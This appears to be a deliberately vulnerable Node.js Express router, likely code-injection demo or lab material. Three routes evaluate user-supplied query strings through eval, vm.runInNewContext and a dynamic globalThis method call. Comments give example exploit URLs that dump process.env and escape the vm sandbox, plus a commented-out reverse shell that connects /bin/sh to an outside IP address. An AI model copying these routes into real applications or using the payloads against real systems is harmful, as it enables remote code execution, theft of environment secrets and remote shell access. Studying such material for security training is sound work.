const vm = require('vm');

const express = require('express');
const router = express.Router();

// http://localhost:3000/eval?args=jscode
/* linux reverse shell
(function(){
    const net=require("net"),
        cp=require("child_process"),
        sh=cp.spawn("/bin/sh",["-i"]);
    const client=new net.Socket();
    client.connect(8080,"18.216.236.191", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /pwned/;
})()
*/


// http://localhost:3000/eval?code=this.process.env
router.get('/eval', function(req, res) {
    res.send(eval(req.query.code));
});


// http://localhost:3000/vm?code=this.constructor.constructor(%27return%20process%27)().env
router.get('/vm', function(req, res) {
    const result = vm.runInNewContext(req.query.code);
    res.send(result);
});


// http://localhost:3000/dynamic-method?method=eval&args=console.log(123)
router.get('/dynamic-method', (req, res) => {
  const method = req.query.method;
  const args = req.query.args;

  const result = globalThis[method](args);

  res.send(result);
});

module.exports = router;
